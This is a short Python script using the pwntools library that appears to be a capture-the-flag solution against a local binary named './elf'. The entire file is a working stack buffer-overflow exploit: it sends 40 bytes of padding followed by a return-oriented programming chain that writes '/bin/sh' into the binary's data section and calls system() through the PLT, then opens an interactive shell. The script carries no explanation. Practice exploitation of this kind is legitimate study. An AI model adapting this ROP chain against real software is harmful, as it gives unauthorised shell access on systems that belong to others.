from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
io=process(p)

sys_plt=0x00000000004005E0
pop_r14_r15=0x0000000000400890 
mov_data=0x0000000000400820
data_addr=0x0000000000601050
pop_edi=0x0000000000400893

payload="a"*40+p64(pop_r14_r15)+p64(data_addr)+"/bin/sh\x00"+p64(mov_data)
payload+=p64(pop_edi)+p64(data_addr)+p64(sys_plt)

io.recvuntil("> ")
io.sendline(payload)

io.interactive()
